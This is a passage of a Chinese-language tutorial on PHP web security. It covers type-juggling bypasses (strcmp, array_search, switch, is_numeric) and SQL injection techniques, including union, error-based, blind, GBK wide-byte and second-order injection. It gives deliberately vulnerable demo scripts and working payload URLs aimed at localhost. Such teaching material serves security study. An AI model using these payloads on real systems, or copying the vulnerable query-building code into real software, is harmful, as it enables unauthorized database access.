<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload: test[]=<span class="hljs-number">0</span><span class="hljs-comment">//可以绕过</span><br></code></pre></td></tr></table></figure>

<p>官方手册对array_search的介绍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">array_search</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span> [], <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span> )<br></code></pre></td></tr></table></figure>

<p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-variable">$a</span>));  <span class="hljs-comment">// int(0) ==&gt; 返回键值0</span><br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;1admin&quot;</span>,<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// int(1) ==&gt; 返回键值1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>array_search函数 类似于 &#x3D;&#x3D; 也就是$a &#x3D;&#x3D;”admin” 当然是$a&#x3D;0  当然如果第三个参数为true则就不能绕过。</p>
<h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;***************&quot;</span><br>     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$password</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Right!!!login success&quot;</span>;n<br>            <span class="hljs-keyword">exit</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Wrong password..&quot;</span>;<br>        &#125;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li>
<li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li>
<li>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li>
<li>payload: password[]&#x3D;xxx</li>
</ul>
<h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;4admin&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$a</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail1&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail2&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail3&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sucess&quot;</span>;  <span class="hljs-comment">//结果输出success;</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;failall&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>原理和上面一样</p>
<h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;xxxx&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]))&#123; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;The time must be number.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &lt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">2</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too short.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>] &gt; <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span> * <span class="hljs-number">3</span>)&#123; <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This time is too long.&#x27;</span>; <br>        &#125;<span class="hljs-keyword">else</span>&#123; <br>                <span class="hljs-title function_ invoke__">sleep</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;time&#x27;</span>]); <br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>        &#125; <br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>知识点：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">()</span></span>，不能正确转换的类型有十六进制型字符串、科学计数法型字符串<br><span class="hljs-function"><span class="hljs-title">is_numeric</span><span class="hljs-params">()</span></span>支持普通数字型字符串、科学记数法型字符串、部分支持十六进制<span class="hljs-number">0</span>x型字符串<br></code></pre></td></tr></table></figure>

<p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt;  time &lt;  7776000</p>
<p>通过is_number() 能传入科学计数法，来进行绕过。</p>
<p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>按照参数类型分类，按数据库返回的结果分类等。</p>
<h5 id="按照参数类型分类"><a href="#按照参数类型分类" class="headerlink" title="按照参数类型分类"></a>按照参数类型分类</h5><p>按照参数类型可以分为两类:数值型、字符型</p>
<p>简单来说，就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">数字型注入<br>加单引号 错误出异常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> 正常<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> 异常<br><br>字符型注入<br>加单引号 错误出异常<br><span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1 正常</span><br><span class="hljs-string">and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">2</span> 异常<br></code></pre></td></tr></table></figure>

<h5 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h5><p>程序拼接的变量值没有被引号包裹。数值型注入是无视php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义函数的影响的。如果程序没有对关键字或者特殊符号过滤或者过滤不严(比如没有过滤union、select等关键字,可以使用联合注入,过滤了union、select等关键字,可以用盲注或者报错注入等方法)</p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;新闻1&#x27;, &#x27;这是第一篇文章&#x27;),<br>(2, &#x27;新闻2&#x27;, &#x27;这是第二篇文章&#x27;);<br></code></pre></td></tr></table></figure>



<p>sqlinjection.php(test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sql出错会报错，方便观察</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;新闻&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$result</span>))&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_row</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$row[&#x27;tid&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>    <span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 union select 1,2,user() --<br></code></pre></td></tr></table></figure>

<p>没有回显可以尝试下看能不能报错注入,比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=1 or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure>

<p>也可以试下时间盲注,比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and sleep(3) --<br></code></pre></td></tr></table></figure>

<p>也可以试下bool盲注(看能不能引起页面变化):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://127.0.0.1/sqlinjection.php?id=3 and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure>

<p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)。</p>
<p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p>
<h5 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h5><p>程序拼接的变量被引号包裹。字符型注入是是受php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义的函数影响的。如果程序没有对引号和关键字或者特殊符号过滤或者过滤不严,可能会导致sql注入。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]; p = <span class="hljs-number">100</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where p = &#x27;3&#x27; and &#x27;1&#x27;=&#x27;2&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>闭合单引号,如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; union select 1,2,user() --<br></code></pre></td></tr></table></figure>

<p>闭合单引号,没有回显可以尝试下看能不能报错注入,比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; or updatexml(2,concat(0x7e,(version())),0) --<br></code></pre></td></tr></table></figure>

<p>也可以试下时间盲注,比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and sleep(5) --<br></code></pre></td></tr></table></figure>

<p>也可以试下bool盲注(看能不能引起页面变化):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">http://xxx/qqq.php?p=1&#x27; and (length(database()))&gt;10 --<br></code></pre></td></tr></table></figure>

<p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)</p>
<p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p>
<h5 id="按数据库返回的结果分类"><a href="#按数据库返回的结果分类" class="headerlink" title="按数据库返回的结果分类"></a>按数据库返回的结果分类</h5><p>据数据库返回的结果,分为回显注入、报错注入、盲注。</p>
<h5 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h5><p>可以直接在存在注入点的当前页面中获取返回结果,可以使用回显注入。</p>
<p>常见利用:</p>
<blockquote>
<p>union select</p>
</blockquote>
<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>程序将数据库的返回错误信息直接显示在页面中。虽然没有返回数据库的查询结果,但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
<p>常见利用:</p>
<blockquote>
<p>floor<br>updatexml<br>extractvalue</p>
</blockquote>
<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。</p>
<ul>
<li>bool盲注(based boolean)<ul>
<li>如果测试时发现页面有变化,可以尝试使用bool盲注</li>
</ul>
</li>
<li>时间盲注(based time)<ul>
<li>如果测试时页面无变化,但是通过sleep发现页面存在延迟,可以尝试使用时间盲注</li>
</ul>
</li>
</ul>
<p>利用:</p>
<ul>
<li>Length()、Substr()、Ascii()、sleep()、if(expr1,expr2,expr3)等结合使用</li>
</ul>
<h5 id="其他特殊注入"><a href="#其他特殊注入" class="headerlink" title="其他特殊注入"></a>其他特殊注入</h5><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>形成条件:</p>
<ul>
<li>开启了<code>gpc</code>或使用<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>等对引号转义的函数</li>
<li>使用了<code>SET NAMES 多字节编码</code>或者<code>set character_set_client=多字节编码</code>指令,这里多字节编码低位的范围需要覆盖0x5C才能导致注入。我们最常见的是<code>gbk</code>编码。</li>
</ul>
<p>假如代码中设置的是GBK编码(mysql那端表或者字段设置的编码无影响,会自动转换),这时只要引入宽字节高位编码吃掉<code>\</code>(%5c),就导致了宽字节注入的发生。</p>
<p>可以参考<a target="_blank" rel="noopener" href="https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/">sql注入：宽字节注入(gbk双字节绕过)</a></p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE IF NOT EXISTS `test`;<br>CREATE TABLE IF NOT EXISTS `news` (<br>  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,<br>  `title` varchar(30) CHARACTER SET utf8 NOT NULL,<br>  `content` varchar(256) CHARACTER SET utf8 NOT NULL,<br>  PRIMARY KEY (`tid`)<br>) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;<br><br>INSERT INTO `news` (`tid`, `title`, `content`) VALUES<br>(1, &#x27;新闻1&#x27;, &#x27;这是第一篇文章&#x27;),<br>(2, &#x27;新闻2&#x27;, &#x27;这是第二篇文章&#x27;);<br></code></pre></td></tr></table></figure>

<p>sqlgbkinjection.php (test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad!&#x27;</span>);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-variable">$conn</span>) OR <span class="hljs-title function_ invoke__">emMsg</span>(<span class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-comment">//执行sql语句</span><br><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) : <span class="hljs-number">1</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>()); <span class="hljs-comment">//sql出错会报错，方便观察</span><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;gbk&quot;</span> /&gt;<br>&lt;title&gt;新闻&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>, MYSQL_ASSOC);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;<span class="hljs-subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="hljs-subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">mysql_free_result</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>测试:<br><code>http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23</code></p>
<h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>首先将构造好的利用代码写入网站保存,再第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。</p>
<p>比如sql二次注入:</p>
<p>在第一次进行数据库插入数据的时候，仅仅只是使用了<code> addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<p>eg:<br>数据表使用的是上面news表</p>
<p>secondaryinjection.php (test on mysql 5.5.38)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 